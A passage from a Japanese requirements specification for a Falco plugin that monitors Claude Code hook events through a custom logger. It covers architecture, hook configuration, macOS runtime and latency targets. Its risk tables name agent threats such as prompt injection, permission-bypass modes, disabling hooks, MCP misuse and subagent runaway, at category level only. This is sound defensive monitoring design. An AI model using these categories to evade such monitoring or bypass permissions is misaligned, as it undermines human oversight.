# falco-plugin-claude-code 要件定義書 v3

**作成日**: 2026-04-26  
**更新日**: 2026-04-26  
**対象**: FALCOYA における Claude Code 用脅威検知 Falco プラグイン  
**仮称**: `falco-plugin-claude-code`  
**推奨 plugin name**: `claude-code`  
**推奨 event source**: `claude_code`  
**推奨 field prefix**: `claude_code.*`  
**初期バージョン**: `v0.1.0`  
**主対象環境**: macOS local runtime / Linux runtime / enterprise managed deployment  
**文書位置付け**: これまでの要件定義 v1/v2 とアーキテクチャ深掘りメモを統合し、Claude Code Hook、OpenTelemetry、macOS実運用、Falco plugin設計、falco-plugin-dev-kit手順を再整理した最新版

---

## 目次

- §-1 改訂履歴
- §0 v3 で明確に修正した重要事項
- §1 要約
- §2 参照したドキュメントと読み取り結果
- §3 背景と現状把握
  - §3.3.1 OpenClaw からの流用不可領域（Non-portable areas）
- §4 目的、ゴール、非ゴール
- §5 推奨アーキテクチャ
- §6 コンポーネント要件（Hook logger / event store / source plugin）
- §7 macOS local runtime 要件
- §8 リアルタイム検知要件
- §9 OpenTelemetry 連携要件
- §10 Event schema 要件
- §11 Threat model（TR-001〜TR-010 主要リスク）
- §12 脅威カテゴリと検知要件（T-001〜T-018）
- §13 Rules 要件（R-001〜R-011）
- §14 Parser / Detector 要件
- §15 Detection と Prevention の分担
- §16 Claude Code 設定・権限・MCP 監査要件
- §17 Security / Privacy 要件
  - §17.1 Redaction 最小パターン
- §18 Falco 設定要件
  - §18.4 PROBLEM_PATTERNS との対応マッピング
- §19 開発ワークフロー要件（Phase 0〜6）
- §20 テスト要件（3 層 E2E + Claude Code 固有）
- §21 Build / Release 要件
  - §21.3 Supply chain 対応（SBOM / 署名 / SLSA）
- §22 運用要件（個人 / チーム / 企業）
  - §22.4 Health check / 監視戦略
  - §22.5 Container / Kubernetes での扱い
- §23 リスク、未解決課題、整合性チェック（RK-001〜RK-012）
- §24 v0.1 Minimum Viable Scope
- §25 v0.2 以降のロードマップ
- §26 受け入れ基準
- §27 実装時の初期値
  - §27.1 プラグイン基本値
  - §27.2 ツールチェーンとプラットフォーム要件
- §28 付録A: Hook event coverage matrix
- §29 付録B: Minimal Falco rule pack 構成
- §30 付録C: README で必ず強調する文言
- §31 付録D: 作業中コンテキスト保持メモ
- §32 最終判断

---

## 改訂履歴

| 改訂 | 日付 | 編集者 | 概要 |
|---|---|---|---|
| v3.0 (initial) | 2026-04-26 | FALCOYA / takaosgb3 | v1/v2 とアーキテクチャ深掘りメモを統合した v3 初版（1378 行） |
| v3.1 (Round 1) | 2026-04-26 | review by Claude Code | 7 件適用: §10.2 型変換注釈、permission_mode 値の修正、§29 付録B に T-013/T-015/T-016/T-017/T-018 追加、§27 を §27.1/§27.2 分割（SDK/Go/Falco/macOS/Linux/GLIBC/License）、§18.4 PROBLEM_PATTERNS マッピング新設、Plugin ID 衝突注意、timestamp timezone ポリシー |
| v3.2 (Round 2) | 2026-04-26 | review by Claude Code | 8 件適用: TOC 追加、§6.1.3 matcher 文法注釈、§17.1 redaction 最小 regex 表新設、§22.4 Health check / 監視戦略 (OPS-001〜OPS-006)、§22.5 Container/Kubernetes 方針、§21.3 SBOM/署名/SLSA (SC-001〜SC-006)、§28 hook event 仕様確認注釈、§27.2 SDK バージョン v0.8.1 確定 |
| v3.3 (Round 3) | 2026-04-26 | review by Claude Code | 6 件適用: §11.4 リスク表に TR-001〜TR-010 ID 付与・RK-* 相互参照、§13 R-011 boolean string field 比較リテラル、§12.1 priority 凡例、§12.3 condition 括弧明示、§3.3.1 OpenClaw 流用不可/再利用領域、§24 「最低 10 / 目標 18 ルール」明示 |
| v3.4 (Round 4) | 2026-04-26 | review by Claude Code | 7 件適用: §18.4 セクションレベル降格 (h2→h3)、§22.4 OPS-005 doctor CLI exit code 仕様、§22.4 OPS-004 self-check 運用注記、§6.1.3 tool 名 Agent/Task 統一注釈、§31 付録D 10→15 項目拡張、§32 冒頭 §0/§1/§32 役割分担明示、TOC 全更新 |
| v3.5 (Round 5) | 2026-04-26 | review by Claude Code | 2 件適用: §25 ロードマップに supply-chain (v0.2)/container (v0.3)/Falco DaemonSet (v0.4)/SLSA L3 (v0.6) 反映、§30 末尾に v0.2 以降 SBOM/署名検証 README 注記と v0.1 で `sha256sum -c` 案内 |

> 詳細な所見・抽出論点は `docs/review/round{1..5}.md`、5 ラウンド集計は `docs/review/convergence_report.md`、進捗は GitHub Issue #1 を参照。
> 累計 5 ラウンドで 30 件の修正を適用、行数 1378 → 約 1610 行に拡張、ID 体系 17 種で連続性を確認、未完了マーカー 0 件で収束。

---

## 0. この v3 で明確に修正した重要事項

本 v3 では、これまでの議論で曖昧だった点を明確に修正する。

| 論点 | v3 の最終判断 |
|---|---|
| `~/.claude/security/events.jsonl` は Claude Code 標準出力か | **標準出力ではない**。本プロジェクトで作成する `claude-code-security-logger` が Claude Code Hook の stdin JSON を正規化して出力する監査ログである。 |
| 通常の Claude Code で使えるか | **使える**。Claude Code の Hook は通常機能として設定でき、command hook は JSON context を stdin で受け取れる。ただし `events.jsonl` を作るには hook logger と Hook 設定が必要。 |
| Falco plugin の primary input | **Hook logger が出力した normalized JSONL**。Claude Code transcript 本体や OpenTelemetry は primary input にしない。 |
| OpenTelemetry の位置付け | **並列の可観測性・相関・中央集約基盤**。低遅延検知の主経路ではなく、Falco alert との相関や組織横断分析に使う。 |
| macOS 上の Claude Code 環境 | **正式な主対象**。開発用だけでなく、実際に Claude Code が動く developer workstation / local runtime として扱う。 |
| リアルタイム検知 | **Hook 発火から Falco alert までの低遅延検知**として定義する。v0.1 の目標は p95 1秒以内、最低条件は p95 5秒以内。 |
| Detect と Prevent の分担 | Falco plugin は **detect-first**。ブロックは `PreToolUse` / `PermissionRequest` / `ConfigChange` の optional policy hook で分離実装する。 |
| Plugin architecture | **event sourcing + field extraction source plugin**。`source: claude_code` の Falco rules で評価する。 |
| OTLP receiver を Falco plugin 内に持つか | v0.1 では **持たない**。Falco プロセス内にネットワーク receiver を持つと責務と攻撃面が増える。 |
| transcript 直接 tail | v0.1 では **非推奨**。schema変更・機密情報・履歴再処理リスクが高い。 |

---

## 1. 要約

本プロジェクトは、Claude Code の Hook イベントをローカルで正規化し、Falco の新しい event source `claude_code` としてリアルタイムに取り込み、Claude Code 固有の危険操作・権限回避・設定改ざん・MCP リスク・秘密情報流出・エージェント暴走を検知する Falco プラグインを FALCOYA の OSS 資産として開発するものである。

推奨アーキテクチャは次の通りである。

```text
Claude Code Hook event
  ↓ stdin JSON
claude-code-security-logger
  ↓ normalized JSONL append, redaction, risk pre-classification
~/.claude/security/events.jsonl
  ↓ fsnotify + polling fallback + rotation reopen
Falco source plugin: claude_code
  ↓ NextBatch(), GOB encoded plugin event
Falco rule engine
  ↓ source: claude_code rules
Falco alert
  ↓ stdout / syslog / webhook / Falcosidekick / SIEM
```

この方式は、通常の Claude Code と互換性があり、macOS の開発端末でも動かせ、ネットワークに依存せず低遅延で検知でき、Falco の plugin/event source/field extraction/rule という設計思想に合う。

ただし、この方式では Claude Code の tool execution を Falco plugin が直接止めることはしない。検知は Falco plugin、ブロックは Claude Code Hook policy という責務分担にする。v0.1 は detect-first として作り、v0.2 以降で optional prevention layer を拡張する。

---

## 2. 参照したドキュメントと読み取り結果

重要事項の見落としを避けるため、以下を参照して要件を再整理した。

| 分類 | 参照ドキュメント | 要件への反映 |
|---|---|---|
| FALCOYA 現状 | `https://falcoya.dev/`, `https://falcoya.dev/news` | FALCOYA は Nginx ログと OpenClaw AI assistant ログのリアルタイム監視資産を持つ。Claude Code でも「ログ/イベントを Falco event source 化する」流れを踏襲する。 |
| Claude Code Hooks | `https://code.claude.com/docs/en/hooks` | Hook は command/http/LLM prompt などで、command hook は stdin JSON、HTTP hook は POST body を受け取る。`PreToolUse`, `PostToolUse`, `PermissionRequest`, `ConfigChange`, `FileChanged`, `PostToolBatch` 等を監視対象にする。 |
| Claude Code Settings | `https://code.claude.com/docs/en/settings` | User/Project/Local/Managed settings、権限ルール、`bypassPermissions`, `disableBypassPermissionsMode`, managed settings、MCP/Plugin設定を監査対象にする。 |
| Claude Code MCP | `https://code.claude.com/docs/en/mcp` | MCP は外部ツール・DB・APIへの接続面であり、scope、transport、OAuth、plugin-provided MCP servers、channel capability をリスク面に含める。 |
| Claude Code OpenTelemetry | `https://code.claude.com/docs/en/monitoring-usage` | metrics/logs/events/traces を export できるが、logs default interval 5秒、metrics 60秒であり、低遅延検知の主入力ではなく相関経路にする。`tool_use_id` は Hook と OTel の相関キーになる。 |
| Claude Code Plugins | `https://code.claude.com/docs/en/plugins`, `https://code.claude.com/docs/en/plugins-reference` | 将来的には hook logger と hook 設定を Claude Code plugin bundle として配布可能。ただし v0.1 は設定ファイル導入でも成立させる。 |
| Falco plugin architecture | `https://falco.org/docs/concepts/plugins/architecture/` | source plugin は event source と plugin event ID を持ち、field extraction capability は event source に対応した fields を提供する。 |
| Falco event sources | `https://falco.org/docs/concepts/event-sources/` | event source は分離され、Falco は異なる source 間の相関をサポートしない。syscall との相関は v0.1 非対象。 |
| Falco plugin usage | `https://falco.org/docs/concepts/plugins/usage/` | rules は loaded plugins の event source に基づいて選択的に compile され、`required_plugin_versions` を記述できる。 |
| falco-plugin-dev-kit | `USER_GUIDE.md`, `plugin-dev-workflow.md`, `SKILL*.md` | Phase 0〜6、3層E2E、macOS `.dylib` / Linux `.so`、`source:` 必須、`evt.type` 不使用、`-buildmode=c-shared`、P001〜P021 の失敗パターンを要件に組み込む。 |

---

## 3. 背景と現状把握

### 3.1 FALCOYA の既存資産

FALCOYA は、Falco plugin によるリアルタイム脅威検知を中心に、次の資産を持つ。

| 資産 | 現状 | Claude Code plugin への示唆 |
|---|---|---|
| `falco-plugin-nginx` | Nginx access log を Falco でリアルタイム解析し、SQLi、XSS、Path Traversal、Command Injection、DDoS、機密ファイルアクセス等を検知する。 | file tail、pattern tests、Falco rule tuning、CI/release の基礎を再利用できる。 |
| `falco-plugin-openclaw` | AI assistant logs を監視し、7種類の脅威、JSONL/plaintext自動判別、ReDoS安全設計を持つ。 | AI assistant 監視の近い参照実装。ただし Claude Code は Hooks、permission mode、MCP、settings、OTel があるため、入力設計から分けるべき。 |
| `falco-plugin-dev-kit` | Claude Code Agent Skills とテンプレートにより、任意ログソース向け Falco plugin を生成・テスト・ビルドできる。 | 本プロジェクトの開発工程は Phase 0〜6 を踏襲する。ただし Claude Code 固有の hook logger と schema を追加する。 |

### 3.2 Claude Code の監査面

Claude Code は agentic coding tool であり、単純なチャットログ監視より監査面が広い。監視対象を MECE に整理すると次の通り。

| 監査面 | 主な Hook / Telemetry | 主なリスク |
|---|---|---|
| セッション | `SessionStart`, `SessionEnd`, `Stop`, `StopFailure`, `PreCompact`, `PostCompact` | 想定外モデル、長時間実行、失敗連鎖、context loss、resume時の過去文脈混入 |
| ユーザー入力 | `UserPromptSubmit`, `UserPromptExpansion` | prompt injection、秘密情報投入、危険操作指示、ポリシー回避指示 |
| ツール実行前 | `PreToolUse`, `PermissionRequest` | 危険 Bash、外部送信、権限昇格、永続許可、deny回避 |
| ツール実行後 | `PostToolUse`, `PostToolUseFailure`, `PostToolBatch` | 実行結果に基づく外部送信、失敗連鎖、tool多発、agent runaway |
| 権限・許可 | `PermissionRequest`, `PermissionDenied`, OTel `tool_decision`, `permission_mode_changed` | `bypassPermissions`、`dontAsk`、allow rule の過剰追加、auto mode denial の再試行 |
| 設定 | `ConfigChange`, `FileChanged`, settings/MCP/plugin files | hooks無効化、permissions変更、MCP追加、skills/agents改ざん、marketplace追加 |
| MCP | MCP tool call, MCP server connection, `.mcp.json`, `~/.claude.json` | 外部API・DBアクセス、OAuth scope過大、stdio command実行、prompt injection経由の外部データ混入 |
| Subagent / team | `SubagentStart`, `SubagentStop`, `TaskCreated`, `TaskCompleted`, agent frontmatter | subagentの権限逸脱、MCP継承、`bypassPermissions`、agent暴走、並列作業の過剰化 |
| Worktree / CWD | `WorktreeCreate`, `WorktreeRemove`, `CwdChanged` | workspace escape、gitignored secretsの複製、意図しない作業ディレクトリ |
| OpenTelemetry | user_prompt, tool_result, tool_decision, mcp_server_connection, hook execution | 組織横断の監査、長期分析、Falco alertとの相関、ただし低遅延主経路には不向き |

### 3.3 OpenClaw との違い

OpenClaw は「AIアシスタントログの脅威検知」として近いが、本プロジェクトは単純な OpenClaw 移植では不十分である。

| 観点 | OpenClaw | Claude Code plugin |
|---|---|---|
| 入力 | AI assistant log / JSONL / plaintext | Claude Code Hook JSON を hook logger が正規化した JSONL |
| 監査粒度 | 会話・ログ中心 | tool実行前後、permission、settings、MCP、subagent、worktree |
| 実行前制御 | 基本は検知 | `PreToolUse` / `PermissionRequest` / `ConfigChange` で optional block 可能 |
| macOS local runtime | 実装依存 | Claude Code 使用端末として正式対象 |
| OTel | 補助的 | Claude Code native OTel と相関可能 |
| plugin 配布 | Falco plugin中心 | Falco plugin + hook logger + optional Claude Code plugin bundle |

#### 3.3.1 OpenClaw から流用してはいけない領域（Non-portable areas）

参照実装としてコードや設計を読むのは有益だが、本プロジェクトに **そのまま** 持ち込んではいけない領域を明示する。

| 領域 | 流用不可の理由 |
|---|---|
| Event schema / field 定義 | OpenClaw の `openclaw.*` フィールドと Claude Code の `claude_code.*` は別 source。Field 名・型・意味論を揃える必然性がない。Field 名を真似ると Falco rule 移植時に混乱する。 |
| Permission model | OpenClaw には Claude Code の `permission_mode` / `PermissionRequest` / `bypassPermissions` 等の概念がない。Permission 関連は本要件 §10 / §16 にもとづいて新規設計する。 |
| MCP 監査 | OpenClaw は MCP（Model Context Protocol）非対応。MCP リスク検知は本要件 §12 T-007 / T-008 / T-018 で新規定義する。 |
| Hook 概念 | OpenClaw は AI assistant 直のログ tail。本要件は Hook 経由の logger を介する。データフロー（§5.1）が異なるため、tail 周りのコードは流用しても hook 受け口は新設する。 |
| Subagent / Task 概念 | OpenClaw に subagent / task イベントは無い。T-013 / T-014 は新規実装。 |
| Severity / risk 体系 | OpenClaw のカテゴリ分けは流用せず、§12.1 T-001〜T-018 と §14.2 detector を主とする。 |

ただし、**安全に再利用してよい領域** は次の通り。
- JSONL tail / fsnotify / rotation reopen の I/O 骨格（P014 / P015 を満たす形で）
- ReDoS safe な文字列検査ヘルパ
- benign / true positive の test fixture 構成方法
- Makefile / golangci.yml / CI workflow のスケルトン

---

## 4. 目的、ゴール、非ゴール

### 4.1 目的

Claude Code 利用時の危険操作、秘密情報流出、権限回避、設定改ざん、MCP悪用、エージェント暴走を、Falco rule によりリアルタイムまたは準リアルタイムに検知し、FALCOYA の OSS 資産として再現性高く開発・テスト・配布できる状態にする。

### 4.2 ゴール

| ID | ゴール | 判定基準 |
|---|---|---|
| G-001 | Claude Code Hook イベントを JSONL に正規化できる | `claude-code-security-logger` が stdin JSON を読み、`~/.claude/security/events.jsonl` に1行1イベントで出力する |
| G-002 | 通常の Claude Code で導入できる | `~/.claude/settings.json` または `.claude/settings.local.json` の hooks 設定だけで動作する |
| G-003 | macOS local runtime を正式サポートする | macOS `.dylib`, `falco-local.yaml`, `--disable-source syscall`, `-U` で検証できる |
| G-004 | Falco plugin が `claude_code` source を提供する | `load_plugins`, `source: claude_code`, `claude_code.*` fields による alert が出る |
| G-005 | v0.1 で10以上の主要脅威カテゴリを検知する | rules と Level 1 pattern fixtures がカテゴリごとに存在する |
| G-006 | 低遅延検知を実現する | end-to-end p95 ≤ 1s を目標、最低 p95 ≤ 5s |
| G-007 | 機密情報を最小化する | redaction、最大長制限、raw payload無効、ファイル権限 `0600` がテストされる |
| G-008 | OpenTelemetry と相関可能にする | `session_id`, `tool_use_id`, `prompt_id` 相当の相関キーを event schema に保持する |
| G-009 | dev-kit の品質ゲートに適合する | `go vet`, `go test`, `make e2e`, `make build/verify`, Level 3 Falco integration が通る |
| G-010 | Linux production と macOS local の成果物を分離する | Linux `.so` と macOS `.dylib` を混同せず、release assets を分ける |

### 4.3 非ゴール

| ID | 非ゴール | 理由 |
|---|---|---|
| NG-001 | Claude Code が標準で `~/.claude/security/events.jsonl` を出す前提にする | そのファイルは本プロジェクトの hook logger 出力であり、標準ファイルではない |
| NG-002 | v0.1 で transcript 本体を主入力にする | schema安定性、再処理、プライバシーリスクが高い |
| NG-003 | v0.1 で OpenTelemetry を Falco plugin の主入力にする | batching/export interval、Collector依存、schema差分、遅延がある |
| NG-004 | Falco plugin が Claude Code の操作を直接ブロックする | ブロックは Hook policy の責務であり、Falco pluginは検知に集中する |
| NG-005 | Falco syscall 監視の代替になる | 本プラグインは Claude Code event source 専用である |
| NG-006 | すべての prompt injection を意味理解で完全検知する | v0.1 は deterministic pattern + context heuristic を主とする |
| NG-007 | raw prompt / raw tool response を無制限保存する | セキュリティ監視ツール自体が情報漏洩源になるため |
| NG-008 | plugin 内に OTLP receiver や HTTP server を組み込む | Falco process の攻撃面・責務・運用負荷が増えるため |

---

## 5. 推奨アーキテクチャ

### 5.1 全体像

```text
┌─────────────────────────────────────────────────────────────┐
│ Claude Code runtime                                         │
│ CLI / IDE / terminal / tools / MCP / permissions / agents    │
└─────────────────────────────┬───────────────────────────────┘
                              │ command hook stdin JSON
                              ▼
┌─────────────────────────────────────────────────────────────┐
│ claude-code-security-logger                                 │
│ - stdin JSON read                                            │
│ - schema normalization                                       │
│ - redaction                                                  │
│ - risk pre-classification                                    │
│ - append-only JSONL write                                    │
│ - stdout quiet / exit behavior configurable                  │
└─────────────────────────────┬───────────────────────────────┘
                              │ append JSONL
                              ▼
┌─────────────────────────────────────────────────────────────┐
│ ~/.claude/security/events.jsonl                              │
│ - project/user configurable                                  │
│ - 1 JSON object per line                                     │
│ - 0600 file, 0700 dir                                        │
│ - rotation-aware                                             │
└─────────────────────────────┬───────────────────────────────┘
                              │ fsnotify + polling fallback
                              ▼
┌─────────────────────────────────────────────────────────────┐
│ Falco source plugin: claude-code                             │
│ event source: claude_code                                    │
│ - Open(): tail setup, SeekEnd default                         │
│ - NextBatch(): bounded wait/batch                            │
│ - Extract(): claude_code.* fields                            │
│ - Close(): watcher/fd cleanup                                │
│ - counters: dropped/malformed/redacted/latency               │
└─────────────────────────────┬───────────────────────────────┘
                              │ plugin events
                              ▼
┌─────────────────────────────────────────────────────────────┐
│ Falco rules                                                  │
│ source: claude_code                                          │
│ fields: claude_code.event_name, tool_name, command, ...      │
└─────────────────────────────┬───────────────────────────────┘
                              │ alert
                              ▼
┌─────────────────────────────────────────────────────────────┐
│ stdout / syslog / webhook / Falcosidekick / SIEM             │
└─────────────────────────────────────────────────────────────┘
```

### 5.2 採用理由

| 評価軸 | Hook JSONL source plugin | 評価 |
|---|---|---|
| 通常 Claude Code 互換性 | Hook 設定だけで導入可能 | 高 |
| macOS local runtime | ローカルファイル + macOS `.dylib` で動作可能 | 高 |
| リアルタイム性 | Hook直後に append、plugin が tail | 高 |
| Falco らしさ | event source + field extraction + rules | 高 |
| ネットワーク依存 | 不要 | 高 |
| 秘密情報管理 | hook logger で redaction 可能 | 高 |
| 実装複雑度 | file tail / rotation / schema は必要 | 中 |
| OTel 連携 | 同じ JSONL を filelog receiver に渡せる | 高 |

### 5.3 代替案比較

| 案 | 概要 | 長所 | 問題 | 採否 |
|---|---|---|---|---|
| A | Hook logger → JSONL → Falco source plugin | 低遅延、通常Claude Code対応、macOS対応、Falcoらしい | logger実装が必要 | **v0.1採用** |
| B | Claude Code native OTel → Collector → Falco plugin | 既存OTelを利用 | export interval、Collector依存、schema差分、Falco内receiverが重い | v0.1非採用 |
| C | Hook HTTP → local sidecar → socket/pipe → plugin | 低遅延、構造化しやすい | sidecar常駐、port/socket管理、攻撃面増加 | v0.2候補 |
| D | transcript JSONL 直接 tail | 実装が単純に見える | schema/プライバシー/再処理/履歴肥大が問題 | 非推奨 |
| E | OTel/SIEMのみ | 中央集約は容易 | Falco pluginとしての価値が薄い、低遅延弱い | 補助用途 |
| F | PreToolUse hook policy のみ | 事前ブロック可能 | Falco alert/監査/統合が弱い | optional prevention |

---

## 6. コンポーネント要件

### 6.1 Hook logger: `claude-code-security-logger`

Hook logger は Falco plugin そのものではなく、Claude Code と Falco plugin の間に置く軽量な入力正規化レイヤーである。

#### 6.1.1 必須要件

| ID | 要件 | 詳細 |
|---|---|---|
| HL-001 | stdin JSON 読み取り | command hook から渡される JSON を読み取る。HTTP hook は v0.1 非対象。 |
| HL-002 | JSON parse | 不正JSONは `malformed` counter を増やし、Claude Code を壊さない。 |
| HL-003 | schema付与 | `schema_version`, `received_at`, `logger_version`, `host`, `user` を付与する。 |
| HL-004 | common fields保持 | `session_id`, `transcript_path`, `cwd`, `permission_mode`, `hook_event_name` を保持する。 |
| HL-005 | type別正規化 | `tool_name`, `tool_use_id`, `tool_input`, `tool_response`, `duration_ms`, `source`, `file_path`, `event`, `permission_suggestions` 等を正規化する。 |
| HL-006 | redaction | API keys, tokens, Authorization headers, private keys, `.env`内容、cookie、SSH key、cloud credentials をマスクする。 |
| HL-007 | JSONL append | 1行1JSON objectで append。改行を含む値は JSON encoding に任せる。 |
| HL-008 | 権限設定 | `~/.claude/security` は `0700`、`events.jsonl` は `0600`。 |
| HL-009 | stdout quiet | 原則 stdout に何も出さない。Claude の context に不要情報を注入しない。 |
| HL-010 | exit policy | defaultは fail-open `exit 0`。高セキュリティ環境は fail-closed を optional にする。 |
| HL-011 | path安全性 | 出力先 path は絶対パスまたは `~` 展開済みとし、symlink/race を検査する。 |
| HL-012 | size limit | 1イベントの raw input / field を最大長で切り詰める。既定: raw 64KB、individual evidence 2KB。 |
| HL-013 | latency | p95 20ms以内を目標、50ms以内を最低条件にする。 |
| HL-014 | testability | Hook input fixtures から logger 出力を deterministic に検証できる。 |

#### 6.1.2 実装方式

| 選択肢 | 判断 |
|---|---|
| Shell script | 初期PoCでは可能だが、JSON parse/redaction/atomic append/shell quoting が不安定になりやすいため非推奨。 |
| Python single file | 早く作れる。macOS標準Pythonの有無に注意。配布時の依存が課題。 |
| Go binary | **推奨**。Falco plugin と同じ Go で実装でき、単体バイナリ配布、JSON処理、redaction、atomic write が安定する。 |

#### 6.1.3 Hook 設定例

個人検証では `~/.claude/settings.json`、プロジェクト検証では `.claude/settings.local.json` を推奨する。

```json
{
  "hooks": {
    "SessionStart": [
      {
        "hooks": [
          {
            "type": "command",
            "command": "/Users/USER/.local/bin/claude-code-security-logger --out ~/.claude/security/events.jsonl"
          }
        ]
      }
    ],
    "UserPromptSubmit": [
      {
        "hooks": [
          {
            "type": "command",
            "command": "/Users/USER/.local/bin/claude-code-security-logger --out ~/.claude/security/events.jsonl"
          }
        ]
      }
    ],
    "PreToolUse": [
      {
        "matcher": "Bash|Read|Write|Edit|WebFetch|WebSearch|Agent|.*",
        "hooks": [
          {
            "type": "command",
            "command": "/Users/USER/.local/bin/claude-code-security-logger --out ~/.claude/security/events.jsonl"
          }
        ]
      }
    ],
    "PostToolUse": [
      {
        "matcher": "Bash|Read|Write|Edit|WebFetch|WebSearch|Agent|.*",
        "hooks": [
          {
            "type": "command",
            "command": "/Users/USER/.local/bin/claude-code-security-logger --out ~/.claude/security/events.jsonl"
          }
        ]
      }
    ],
    "PermissionRequest": [
      {
        "matcher": "Bash|Read|Write|Edit|WebFetch|WebSearch|Agent|.*",
        "hooks": [
          {
            "type": "command",
            "command": "/Users/USER/.local/bin/claude-code-security-logger --out ~/.claude/security/events.jsonl"
          }
        ]
      }
    ],
    "ConfigChange": [
      {
        "hooks": [
          {
            "type": "command",
            "command": "/Users/USER/.local/bin/claude-code-security-logger --out ~/.claude/security/events.jsonl"
          }
        ]
      }
    ]
  }
}
```

> **matcher 文法と推奨初期値**:
> - Claude Code の matcher は正規表現として解釈される。`Bash|Edit` は OR、`.*` は任意ツールにマッチする。
> - 上記サンプルの `Bash|Read|Write|Edit|WebFetch|WebSearch|Agent|.*` は `.*` がすべてにマッチするため列挙部分は冗長。意図を明確にするには次のいずれかを推奨する。
>   - **明示列挙パターン**: `^(Bash|Read|Write|Edit|WebFetch|WebSearch|Task)$` のように主要ツール名のみ。MCP tool は `mcp__.*` で別 matcher を追加する。
>   - **完全網羅パターン**: `.*` 単独。すべての tool を logger に渡す代わりに、誤分類を logger 側のクラス分けで吸収する。
> - tool 名（例: `Agent` / `Task` / `Read`）は Claude Code 公式仕様に依存する。最新ツール名は Claude Code Hooks ドキュメントで確認し、リリース前に fixtures との整合をテストする。
>
> **本サンプルの位置づけ**: 上記は最小例であり、§28 の Hook event coverage matrix で「必須」とした `PostToolBatch` / `FileChanged` / `PermissionDenied` / `SessionEnd` 等は省略している。実運用では §28 と §24 v0.1 必須スコープに従い、必要 hook をすべて追加する。
>
> **tool 名の統一注意**: 本要件では subagent 起動 tool 名として一部で `Agent`、別箇所で `Task` を例示している（Claude Code は時期により tool 名が `Task` / `Agent` / 双方存在する場合あり）。実装時は最新の Claude Code Hooks 仕様 (`https://code.claude.com/docs/en/hooks`) を確認して fixtures を揃え、不要な tool 名は matcher から削除する。曖昧な期間では `.*` で fallback し、logger 内で正規化フィールド `tool_name` を統一表記に揃える方針を取る。

### 6.2 JSONL event store

| ID | 要件 |
|---|---|
| ES-001 | default path は `~/.claude/security/events.jsonl` とする。ただし設定で変更可能にする。 |
| ES-002 | `~/.claude/security` は `0700`、ファイルは `0600`。 |
| ES-003 | JSONL は append-only。ログローテーションに対応する。 |
| ES-004 | 起動時の既存ログ再処理を避けるため、Falco plugin は default で `SeekEnd` から開始する。テストや replay では `start_at=beginning` を設定可能にする。 |
| ES-005 | ローテーションは rename/truncate の両方に対応する。 |
| ES-006 | corrupt line は破棄または隔離し、plugin を停止させない。 |
| ES-007 | `raw_event_sha256` を保持し、raw全体を保存しなくても重複・追跡ができるようにする。 |

### 6.3 Falco source plugin: `claude-code`

| ID | 要件 | 詳細 |
|---|---|---|
| FP-001 | Event source | `claude_code` を広告する。 |
| FP-002 | Plugin name | `claude-code` を推奨。Falco yaml の `load_plugins` と一致させる。 |
| FP-003 | Plugin ID | 開発中は `999`。公開前に Falco Plugin Registry (`https://github.com/falcosecurity/plugins`) で正式 ID を取得する。`999` が他プラグインで予約されている場合は別の暫定値（10000番台）に変更する。Registry 登録時には plugin name / event source / source plugin ID の三つを Falco Project と調整する。 |
| FP-004 | Capabilities | event sourcing + field extraction。event parsing / async events は v0.1 非対象。 |
| FP-005 | InitSchema | log path、start_at、buffer size、poll interval、debug、redaction policy、replay mode を設定可能にする。 |
| FP-006 | Open | file tail、watcher、polling fallback、SeekEnd default、rotation reopen を初期化する。 |
| FP-007 | NextBatch | bounded wait でイベントを返す。空待ちで busy loop しない。 |
| FP-008 | Fields | `claude_code.*` fields をすべて定義する。 |
| FP-009 | Extract | `Fields()` と 1:1 で対応する。未定義 field は返さない。 |
| FP-010 | Close | watcher、fd、goroutine、channel を確実に解放する。 |
| FP-011 | Counters | dropped、malformed、redacted、latency、rotation、reopen を debug/field で観測可能にする。 |
| FP-012 | Backpressure | channel full 時は drop counter を増やし、Falco を hang させない。高セキュリティでは fail mode configurable。 |
| FP-013 | Cross-source | syscall との相関は行わない。必要なら SIEM/OTel 側で相関する。 |

---

## 7. macOS local runtime 要件

### 7.1 macOS を主対象にする理由

Claude Code は MacBook 上の CLI / IDE で日常的に使われるため、macOS は「開発用ビルド環境」ではなく、実際の監視対象 runtime である。したがって v0.1 から macOS local runtime を正式対象にする。

### 7.2 macOS 要件

| ID | 要件 |
|---|---|
| MAC-001 | macOS arm64 `.dylib` をビルドできる。Intel macOS は可能ならサポート対象、最低限 arm64。 |
| MAC-002 | `falco-local.yaml` を用意し、macOS 固有の output 設定エラーを避ける。 |
| MAC-003 | 実行例は `falco -c falco-local.yaml --disable-source syscall -U` を標準とする。 |
| MAC-004 | macOS では syscall 監視を主目的にしない。Claude Code event source に集中する。 |
| MAC-005 | `~/.claude/settings.json`, `.claude/settings.json`, `.claude/settings.local.json`, `~/.claude.json`, `.mcp.json` を監査対象に含める。 |
| MAC-006 | `~/.claude/security/events.jsonl` の権限とローテーションをテストする。 |
| MAC-007 | macOS native Level 3 integration test を用意する。Falco未導入環境では Level 1/2 を通す。 |
| MAC-008 | Apple Silicon での `.dylib` と Linux `.so` を release asset 上で明確に区別する。 |

### 7.3 macOS 実行例

```bash
# plugin build
make build

# local Falco run
falco \
  -c falco-local.yaml \
  --disable-source syscall \
  -U
```

### 7.4 macOS で避けるべき失敗

| 失敗 | 対策 |
|---|---|
| macOS `.dylib` を Linux 用として配布する | release asset 名と `file` 検証を必須化する。 |
| macOS で Linux `.so` を作ろうとする | Linux向けは Linux/CI で `CGO_ENABLED=1 -buildmode=c-shared` を使う。 |
| Falco output 設定で起動エラー | `falco-local.yaml` を使う。 |
| alert が stdout に出ない | `-U` を付ける。 |
| syscall source の前提で設計する | macOS local は `claude_code` source 専用と割り切る。 |

---

## 8. リアルタイム検知要件

### 8.1 リアルタイムの定義

本プロジェクトでいうリアルタイムは、kernel syscall level の同期検知ではなく、**Claude Code Hook event 発生から Falco alert 出力までの低遅延検知**である。

### 8.2 Latency SLO

| 指標 | v0.1 目標 | v0.1 最低条件 |
|---|---:|---:|
| Hook logger latency | p95 ≤ 20ms | p95 ≤ 50ms |
| JSONL write → plugin ingest | p95 ≤ 250ms | p95 ≤ 1s |
| Plugin ingest → Falco alert | p95 ≤ 500ms | p95 ≤ 2s |
| End-to-end alert latency | p95 ≤ 1s | p95 ≤ 5s |
| Sustained throughput | 100 events/sec | 50 events/sec |
| Drop rate | 0% under target load | drop counter必須 |
| Max single event size | 64KB raw input | larger events truncated/redacted |

### 8.3 実装方針

| 項目 | 方針 |
|---|---|
| File watch | fsnotify を主、polling fallback を併用。 |
| NextBatch timeout | 100〜500ms 程度の bounded wait。busy loopは禁止。 |
| Batch size | 1〜64 events configurable。latency優先では小さめ。 |
